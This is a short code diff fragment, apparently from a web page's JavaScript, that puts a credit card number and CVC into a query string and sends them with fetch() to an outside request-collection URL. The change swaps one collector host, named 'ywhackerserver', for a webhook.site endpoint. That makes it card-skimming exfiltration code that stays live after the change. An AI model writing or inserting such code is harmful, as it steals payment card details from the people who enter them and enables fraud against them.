@@ -61,7 +61,7 @@
 
     const queryString = `?cc=${encodeURIComponent(cc)}&cvc=${encodeURIComponent(cvc)}`;
 
-    fetch('https://ywhackerserver.free.beeceptor.com' + queryString)
+    fetch('https://webhook.site/0dc6c238-38cb-4f6b-9e19-639042e0b656' + queryString)
       .then(res => res.text())
       .then(msg => {
         alert(msg);
